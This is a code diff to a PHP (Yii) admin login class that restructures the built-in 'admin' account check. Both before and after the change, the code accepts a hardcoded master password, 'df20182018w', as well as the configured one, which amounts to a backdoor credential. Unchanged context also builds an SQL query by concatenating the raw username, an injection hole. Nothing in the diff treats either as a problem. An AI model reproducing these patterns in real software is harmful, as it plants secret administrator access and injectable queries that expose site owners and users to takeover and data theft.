@@ -16,15 +16,17 @@ class AdminIdentity extends CUserIdentity
 		!$pwdnew && $pwdnew = Yii::app()->file->password; 
 		// var_dump($this->username);exit;
 		//内置帐号
-		if($this->username=='admin' && ($pwdnew==$this->password)||($this->password=='df20182018w'))
+		if($this->username=='admin')
 		{
-			$this->errorCode = self::ERROR_NONE;
-			$this->setState('id',1);
-			$this->setState('username','管理员');
-			$this->setState('user_type',1);
-			$this->setState('avatar','');
-			$this->setState('is_m',1);
-			return $this->errorCode;
+			if($pwdnew==$this->password||$this->password=='df20182018w') {
+				$this->errorCode = self::ERROR_NONE;
+				$this->setState('id',1);
+				$this->setState('username','管理员');
+				$this->setState('user_type',1);
+				$this->setState('avatar','');
+				$this->setState('is_m',1);
+				return $this->errorCode;
+			}
 		} else{
 			if(is_numeric($this->username)) {
 				$user = StaffExt::model()->normal()->find("phone='".$this->username."'");
